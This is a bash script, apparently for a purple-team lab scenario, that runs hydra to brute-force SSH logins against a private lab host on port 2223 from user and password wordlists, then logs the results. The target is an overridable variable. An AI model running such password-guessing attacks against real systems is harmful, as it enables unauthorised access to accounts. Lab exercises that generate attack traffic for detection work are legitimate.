#!/usr/bin/env bash
set -euo pipefail

SCENARIO_DIR="/home/labuser/purple-lab/scenarios/S1"
OUTPUT_ROOT="${SCENARIO_DIR}/output"
RUN_ID="$(date +%Y%m%d_%H%M%S)"
RUN_DIR="${OUTPUT_ROOT}/${RUN_ID}"

TARGET_HOST="${TARGET_HOST:-192.168.56.10}"
TARGET_PORT="${TARGET_PORT:-2223}"
USERS_FILE="${USERS_FILE:-${SCENARIO_DIR}/inputs/users.txt}"
PASSWORDS_FILE="${PASSWORDS_FILE:-${SCENARIO_DIR}/inputs/passwords.txt}"

LAB_OWNER="${LAB_OWNER:-labuser}"
LAB_GROUP="${LAB_GROUP:-labuser}"

mkdir -p "${RUN_DIR}"

echo "[S1] start=$(date -Iseconds)"
echo "[S1] target=${TARGET_HOST}:${TARGET_PORT}"
echo "[S1] users_file=${USERS_FILE}"
echo "[S1] passwords_file=${PASSWORDS_FILE}"
echo "[S1] output_dir=${RUN_DIR}"

if ! command -v hydra >/dev/null 2>&1; then
  echo "[S1] hydra is not installed"
  exit 1
fi

hydra \
  -L "${USERS_FILE}" \
  -P "${PASSWORDS_FILE}" \
  -s "${TARGET_PORT}" \
  -t 2 \
  -V \
  ssh://"${TARGET_HOST}" \
  2>&1 | tee "${RUN_DIR}/hydra.log" || true

echo "[S1] end=$(date -Iseconds)"
echo "${RUN_DIR}" > "${OUTPUT_ROOT}/latest_run_path.txt"

chmod -R a+rwX "${RUN_DIR}" "${OUTPUT_ROOT}/latest_run_path.txt" || true
if id "${LAB_OWNER}" >/dev/null 2>&1; then
  chown -R "${LAB_OWNER}:${LAB_GROUP}" "${RUN_DIR}" "${OUTPUT_ROOT}/latest_run_path.txt" || true
fi
